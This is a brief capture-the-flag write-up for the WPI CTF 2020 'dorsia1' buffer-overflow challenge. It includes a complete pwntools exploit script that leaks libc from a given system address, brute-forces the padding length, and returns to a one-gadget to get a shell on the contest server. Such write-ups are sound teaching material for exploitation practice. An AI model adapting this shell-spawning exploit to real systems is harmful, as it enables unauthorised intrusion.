# dorsia1 100pts (119 solves) #

![TASK](https://imgur.com/UYebsbW.png)

we are given the source code , it's a buffer overflow but we don't know the offset , i leaked the libc (using the system address) and used a one gadget from the libc to return to it

![CODE](https://imgur.com/sj0QL9v.png)

Here is my full exploit , i'll share a detailed writeup about dorsia1 and dorsia3 in the next few days on my personal website so stay tuned (My twitter @BelkahlaAhmed1)

```python
from pwn import *
for i in range(69,90):
        p=remote("dorsia1.wpictf.xyz",31337)
#p=process("./pwn")
        leak=p.recvline()
        SYSTEM=int(leak,16)-765772
        BASE=SYSTEM-0x0004f440
        log.info("System address: "+hex(SYSTEM))
        log.info("Base: "+hex(BASE))
        one_gadget=BASE+0x0004f322
        log.info("One gadget: "+hex(one_gadget))
        payload="\x00"*i
        payload+=p64(one_gadget)
        p.sendline(payload)
        p.sendline("id")
        try:
                data=p.recvline()
                if "gid" in data: 
                        log.info("Fouuund!")
                        p.interactive()
        except Exception:
                continue
```
**Note:** The source code link is [HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/WPI%20CTF%202020/dorsia1/task.c)

If you have any questions you can contact me on twitter @BelkahlaAHmed1
